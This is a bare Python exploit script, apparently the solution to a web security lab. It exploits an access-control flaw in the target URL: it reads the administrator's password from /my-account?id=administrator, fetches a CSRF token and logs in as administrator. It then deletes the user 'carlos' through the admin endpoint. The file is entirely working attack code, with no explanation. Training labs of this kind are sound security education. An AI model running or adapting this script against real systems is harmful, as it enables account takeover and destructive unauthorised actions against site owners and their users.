import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

    base_url = sys.argv[1].rstrip('/')

    response1 = requests.get(f'{base_url}/my-account?id=administrator')
    password = re.search(r'[a-z0-9]{20}', response1.text).group(0)

    session = requests.Session()
    response2 = session.get(f'{base_url}/login')
    csrf_token = re.search(r'name="csrf" value="(.+?)"', response2.text).group(1)
    print(csrf_token)
    login_data = {
        'username': 'administrator',
        'password': password,
        'csrf': csrf_token
    }
    session.post(f'{base_url}/login', data=login_data)
    session.get(f'{base_url}/admin/delete?username=carlos')
